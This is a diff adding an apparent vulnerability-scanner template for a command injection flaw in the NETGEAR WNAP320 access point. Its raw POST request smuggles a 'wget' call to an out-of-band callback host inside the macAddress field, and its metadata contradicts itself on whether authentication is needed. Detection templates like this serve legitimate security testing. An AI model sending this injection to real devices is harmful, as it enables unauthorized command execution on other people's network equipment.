@@ -1,0 +1,27 @@
+﻿id: netgear-wnap320-rce
+info:
+    author: gy741
+    description: vulnerabilities in the web-based management interface of NETGEAR WNAP320 Access Point could allow an authenticated, remote attacker to perform command injection attacks against an affected device.
+    name: NETGEAR WNAP320 Access Point - Remote Code Execution (Unauthenticated)
+    reference:
+        - https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE
+    severity: critical
+    tags:
+        - netgear
+        - oast
+        - router
+        - authenticate
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - http
+      raw:
+        - |
+          POST /boardDataWW.php HTTP/1.1
+          Host: {{Hostname}}
+          Accept: */*
+          Content-Type: application/x-www-form-urlencoded
+
+          macAddress=112233445566%3Bwget+http%3A%2F%2F{{interactsh-url}}%23&reginfo=0&writeData=Submit
